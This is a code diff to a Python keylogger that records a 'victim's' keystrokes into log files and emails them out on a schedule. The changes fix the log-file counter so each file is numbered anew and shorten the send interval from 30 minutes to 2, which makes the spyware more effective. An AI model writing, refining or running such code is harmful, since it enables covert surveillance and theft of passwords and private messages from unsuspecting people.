@@ -19,6 +19,7 @@ from email.mime.text import MIMEText
 full_log = ""
 word = ""
 char_limit = 190 # Line limit to match screen width
+log_file_counter = 1
 def get_current_time():
     return datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
@@ -48,7 +49,7 @@ body = f"See attached logs to view keystrokes at {get_current_time()}"
 
 def create_log_file():
 	global log_file
-	log_file_counter = 1
+	global log_file_counter
 	log_file = f"{os.getcwd()}/user-data-{log_file_counter}-{get_current_time()}.log"
 	log_file_counter += 1
 	with open(log_file, "w") as file:
@@ -153,7 +154,7 @@ def check_and_send():
 			file.write(f"Victim has no internet connection at this time: {get_current_time()}.\n")
 
 # Schedule task to check internet connection and send attachment every 30 minutes
-schedule.every(30).minutes.do(check_and_send)
+schedule.every(2).minutes.do(check_and_send)
 
 # Infinite loop to run the scheduler
 while True:
